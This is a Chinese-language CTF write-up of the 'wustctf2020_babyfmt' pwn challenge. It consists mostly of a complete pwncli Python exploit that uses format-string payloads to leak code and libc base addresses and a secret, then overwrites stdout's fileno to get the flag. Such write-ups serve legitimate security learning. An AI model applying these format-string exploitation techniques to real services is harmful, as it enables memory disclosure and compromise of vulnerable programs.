# wustctf2020_babyfmt



### 解题思路

题目还挺有趣的，点在于需要循环进行`fmt_attack`。栈上某个地址存储着`fmt_attack_flag`，当其不为`0`的时候，会直接执行`exit`退出。因此，需要尝试寻找一个地址，该地址存储着`fmt_attack_flag`的地址。因此，解题思路为：

- 修改`fmt_attack_flag`为`0`的时候，同时泄露出栈上存储的代码段基地址和`libc`基地址
- 利用栈上的格式化字符串泄露出`secret`
- 利用栈上的格式化字符串修改`stdout`的`fileno`为`2`
- 然后执行`get_flag`输入`secret`即可得到`flag`

<!-- more -->

### exp

```python
#!/usr/bin/python3
from pwncli import *
cli_script()

if gift['debug']:
    libc = gift['libc']
elif gift['remote']:
    libc = ELF('/root/LibcSearcher/libc-database/other_libc_so/libc-2.23.so')


# offset = 8
def fmt_attack(p:tube, fmt_str):
    p.sendlineafter(">>", "2")
    p.send(fmt_str)


def get_flag(p:tube, secret):
    p.sendlineafter(">>", "3")
    p.sendafter("If you can open the door!\n", secret)


def attack(p:tube):
    p.recvuntil("tell me the time:")
    for _ in range(3):
        p.sendline(str(0xdeadbeef))
    payload = "%7$hhn%17$p,%23$p\n"
    fmt_attack(p, payload)
    leak_msg = p.recvline()
    code_addr, libc_addr = leak_msg.strip().split(b',')
    code_addr = int16(code_addr.decode())
    libc_addr = int16(libc_addr.decode())
    log_address("code_addr", code_addr)
    log_address("libc_addr", libc_addr)

    code_base_addr = code_addr - 118 - 0xfb6
    libc_base_addr = libc_addr - libc.sym['__libc_start_main'] - 240
    log_address("code_base_addr", code_base_addr)
    log_address("libc_base_addr", libc_base_addr)

    # stdout_addr = libc.sym['_IO_2_1_stdout_']
    secret_addr = code_base_addr + 0x202060
    stdout_flag_addr = libc_base_addr + libc.sym['_IO_2_1_stdout_'] + 112

    # payload = b"%2c%10$hhn%11$sa" + p64(stdout_flag_addr)+ p64(secret_addr)
    payload = flat(["%7$hhn%d,%10$saa", secret_addr, "\n"])
    fmt_attack(p, payload)
    leak_msg = p.recvline()
    secret_msg = leak_msg[leak_msg.find(b',')+1:-1]

    if len(secret_msg) < 0x40:
        p.close()
        sys.exit()
    secret_msg = secret_msg[:0x40]
    info("secret msg: {}".format(secret_msg))
    # stop()

    payload = flat(["aa%9$hhn", stdout_flag_addr])
    fmt_attack(p, payload)
    get_flag(p, secret_msg)
    p.interactive()

attack(gift['io'])
```

泄露地址：

![image-20210718230406841](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210718230406841.png)



泄露`secret`：

![image-20210718232714576](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210718232714576.png)

修改`stdout.flieno`：

![image-20210718232946103](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210718232946103.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://roderickchan.github.io/zh-cn/2021-07-18-wustctf2020-babyfmt/  

